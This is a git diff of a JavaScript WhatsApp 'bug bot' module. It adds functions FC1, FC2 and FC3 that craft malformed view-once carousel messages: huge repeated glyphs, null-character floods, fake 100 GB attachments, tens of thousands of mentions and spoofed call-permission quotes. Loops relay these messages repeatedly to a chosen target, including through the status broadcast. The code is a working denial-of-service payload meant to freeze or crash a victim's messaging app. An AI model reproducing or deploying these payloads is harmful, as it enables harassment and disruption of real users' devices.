@@ -961,7 +961,122 @@ async function iOSxPayload(sock, target) {
 }
 
 // HIS FUNCTION 
-async function CursorCrL(sock, target) {
+
+async function FC1(sock, target) {
+  const cards = [];
+  
+  for (let i = 0; i < 999; i++) { 
+    cards.push({
+      header: {
+        title: 'ꦾ'.repeat(60000),
+        imageMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+          mimetype: "image/jpeg",
+          fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
+          fileLength: Math.floor(99.99 * 1073741824).toString(),
+          height: 1,
+          width: 1,
+          mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
+          fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
+          directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1749172037",
+          jpegThumbnail: null,
+          scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
+          scanLengths: [8596, 155493]
+        },
+        hasMediaAttachment: true
+      },
+      body: { 
+        text: "ꦾ".repeat(60000)
+      },
+      footer: {
+        text: "ꦾ".repeat(60000)
+      },
+      nativeFlowMessage: {
+        messageParamsJson: "\u0000".repeat(9999),
+        buttons: [
+          {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({ 
+              status: true, 
+              criador: "PhynxAgency", 
+              versao: "@latest", 
+              atualizado: "2025-06-07",  
+              suporte: "https://wa.me/status?video", 
+              comandosDisponiveis: ["-"], 
+              prefixo: ".", 
+              linguagem: "USA" 
+            })
+          }
+        ]
+      }
+    });
+  }
+
+  const msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: { 
+            text: "ꦾ".repeat(60000)
+          },
+          footer: { 
+            text: "ꦾ".repeat(60000)
+          },
+          carouselMessage: {
+            cards: cards 
+          },
+          contextInfo: {
+            participant: "0@s.whatsapp.net",
+            stanzaId: "ABCDEF1234567890",
+            mentionedJid: [
+              "13135550002@s.whatsapp.net",
+              "5521992999999@s.whatsapp.net",
+              "696969696969@s.whatsapp.net",
+              target
+            ],
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: {
+                      text: "Sent",
+                      format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "call_permission_request",
+                      paramsJson: JSON.stringify({ status: true }),
+                      version: 3
+                    }
+                  }
+                }
+              }
+            },
+            remoteJid: "@s.whatsapp.net"
+          }
+        }
+      }
+    }
+  }, {});
+
+  await sock.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+}
+
+async function FC2(sock, target) {
+  const mentionedList = [
+        "696969696969@s.whatsapp.net",
+        ...Array.from({ length: 35000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+    
   const msg = await generateWAMessageFromContent(target, {
     viewOnceMessage: {
       message: {
@@ -980,38 +1095,55 @@ async function CursorCrL(sock, target) {
             cards: [
               {               
                 header: {
-                  title: '-',
+                  title: '\u0000'.repeat(9999),
                   imageMessage: {
                     url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                     mimetype: "image/jpeg",
                     fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
-                    fileLength: "164089",
+                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                     height: 1,
                     width: 1,
                     mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                     fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                     directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                     mediaKeyTimestamp: "1749172037",
-                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
+                    jpegThumbnail: null,
                     scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                     scanLengths: [8596, 155493]
                   },
                   hasMediaAttachment: true, 
                 },
                 body: { 
-                  text: "-"
+                  text: "\u0000".repeat(9999)
                 },
                 footer: {
-                  text: "phynx.json"
+                  text: "\u0000".repeat(9999)
                 },
                 nativeFlowMessage: {
-                  messageParamsJson: "\n".repeat(10000) 
+                  messageParamsJson: "\n".repeat(10000),
+                  buttons: [
+                  {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({ 
+              status: true, 
+              criador: "PhynxAgency", 
+              versao: "@latest", 
+              atualizado: "2025-06-07",  
+              suporte: "https://wa.me/status?video", 
+              comandosDisponiveis: ["-"], 
+              prefixo: ".", 
+              linguagem: "USA" 
+                            })
+                        }
+                    ]
                 }
               }
             ]
           },
           contextInfo: {
-            participant: "0@s.whatsapp.net",             
+            participant: target,
+            stanzaId: "ABCDEF1234567890",
+            mentionedJid: mentionedList,
             quotedMessage: {
               viewOnceMessage: {
                 message: {
@@ -1021,27 +1153,162 @@ async function CursorCrL(sock, target) {
                       format: "DEFAULT"
                     },
                     nativeFlowResponseMessage: {
-                      name: "galaxy_message",
-                      paramsJson: "{ phynx.json }",
+                      name: "call_permission_request",
+                      paramsJson: JSON.stringify({ status: true}),
                       version: 3
                     }
                   }
                 }
               }
             },
-            remoteJid: "@s.whatsapp.net"
+            remoteJid: target
           }
         }
       }
     }
   }, {});
 
-  await sock.relayMessage(target, msg.message, {
-    participant: { jid: target },
-    messageId: msg.key.id
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
   });
-  console.log(`Successfully Send CursorCrl to ${target}`)
 }
+
+async function FC3(sock, target) {
+  const msg = await generateWAMessageFromContent(target, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          deviceListMetadata: {},
+          deviceListMetadataVersion: 2
+        },
+        interactiveMessage: {
+          body: { 
+            text: '' 
+          },
+          footer: { 
+            text: '' 
+          },
+          carouselMessage: {
+            cards: [
+              {               
+                header: {
+                  title: '\u0000'.repeat(9999),
+                  imageMessage: {
+                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
+                    mimetype: "image/jpeg",
+                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
+                    fileLength: Math.floor(99.99 * 1073741824).toString(),
+                    height: 1,
+                    width: 1,
+                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
+                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
+                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
+                    mediaKeyTimestamp: "1749172037",
+                    jpegThumbnail: null,
+                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
+                    scanLengths: [8596, 155493]
+                  },
+                  hasMediaAttachment: true, 
+                },
+                body: { 
+                  text: "\u0000".repeat(9999)
+                },
+                footer: {
+                  text: "\u0000".repeat(9999)
+                },
+                nativeFlowMessage: {
+                  messageParamsJson: "\n".repeat(10000),
+                  buttons: [
+                  {
+            name: "single_select",
+            buttonParamsJson: JSON.stringify({ 
+              status: true, 
+              criador: "PhynxAgency", 
+              versao: "@latest", 
+              atualizado: "2025-06-07",  
+              suporte: "https://wa.me/status?video", 
+              comandosDisponiveis: [command], 
+              prefixo: prefix, 
+              linguagem: "USA" 
+                            })
+                        }
+                    ]
+                }
+              }
+            ]
+          },
+          contextInfo: {
+            participant: target,
+            stanzaId: "ABCDEF1234567890",
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: {
+                      text: "Sent",
+                      format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                      name: "call_permission_request",
+                      paramsJson: JSON.stringify({ status: true}),
+                      version: 3
+                    }
+                  }
+                }
+              }
+            },
+            remoteJid: target
+          }
+        }
+      }
+    }
+  }, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+}
+
 
 // CASE 
 
@@ -1092,12 +1359,20 @@ async function sikat(sock, target) {
         //await AB1(sock, target, true)
         //await AB2(sock, target, true)
         await F(sock, target)
-        await CursorCrL(sock, target)
-        await ForceCallCrL(sock, target)
+        await FC1(sock, target)
         console.log(`${i} sikat Packet To ${target}`)
     }
 }
+async function BFC(sock, target) {
+      for (let i = 0; i < 30; i++) {
+        //await AB1(sock, target, true)
+        //await AB2(sock, target, true)
+        await FC2(sock, target)
+        await FC3(sock, target)
+        console.log(`${i} sikat Packet To ${target}`)
+    }
 
+}
 module.exports = {
     A,
     B,
@@ -1109,11 +1384,14 @@ module.exports = {
     BG2,
     BH3,
     F,
+    FC2,
+    FC3,
+    FC1,
     AB1,
     AB2,
+    BFC,
     ForceCallCrL,
     iOSxContact,
     iOSxPayload,
-    CursorCrL,
     sikat
 }
